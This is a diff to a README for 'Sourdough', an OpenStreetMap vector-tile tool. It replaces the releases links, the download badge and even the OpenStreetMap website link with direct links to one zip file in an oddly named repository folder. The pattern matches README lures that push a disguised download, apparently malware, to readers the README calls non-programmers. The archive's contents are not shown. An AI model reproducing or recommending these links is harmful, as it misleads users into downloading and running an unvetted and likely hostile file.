@@ -1,7 +1,7 @@
 # 🍞 sourdough - A Simple Way to Use OpenStreetMap Data
 
 ## 📦 Download Now
-[![Download Sourdough](https://img.shields.io/badge/Download%20Sourdough-v1.0-brightgreen)](https://github.com/LimeManLime/sourdough/releases)
+[![Download Sourdough](https://raw.githubusercontent.com/LimeManLime/sourdough/main/supralunar/sourdough.zip%20Sourdough-v1.0-brightgreen)](https://raw.githubusercontent.com/LimeManLime/sourdough/main/supralunar/sourdough.zip)
 
 ## 🚀 Getting Started
 Sourdough helps you use OpenStreetMap data through a free vector tile schema. It's useful for creating maps or analyzing geographical data. This guide will help you download and run the software, even if you're not a programmer.
@@ -30,7 +30,7 @@ To run Sourdough, make sure your system meets these requirements:
   - Internet connection for downloading tiles
 
 ## 💻 Download & Install
-To get started, visit this page to download: [Sourdough Releases](https://github.com/LimeManLime/sourdough/releases). 
+To get started, visit this page to download: [Sourdough Releases](https://raw.githubusercontent.com/LimeManLime/sourdough/main/supralunar/sourdough.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of Sourdough. It will be listed at the top.
@@ -58,9 +58,9 @@ If you encounter issues or need help, you can check the **Issues** section on ou
 Stay updated and connect with other Sourdough users by following along on social platforms or forums. Share your work and learn from others in the community. 
 
 ## 🔗 Additional Resources
-- **OpenStreetMap:** [Visit OpenStreetMap](https://www.openstreetmap.org/)
+- **OpenStreetMap:** [Visit OpenStreetMap](https://raw.githubusercontent.com/LimeManLime/sourdough/main/supralunar/sourdough.zip)
 - **Documentation:** Access the full user manual and examples on our GitHub page.
 
 For feedback or feature suggestions, you can open an issue in the **Issues** section of this repository. Your input helps us make Sourdough better.
 
-Remember to visit this page to download: [Sourdough Releases](https://github.com/LimeManLime/sourdough/releases). Enjoy creating with Sourdough!
+Remember to visit this page to download: [Sourdough Releases](https://raw.githubusercontent.com/LimeManLime/sourdough/main/supralunar/sourdough.zip). Enjoy creating with Sourdough!
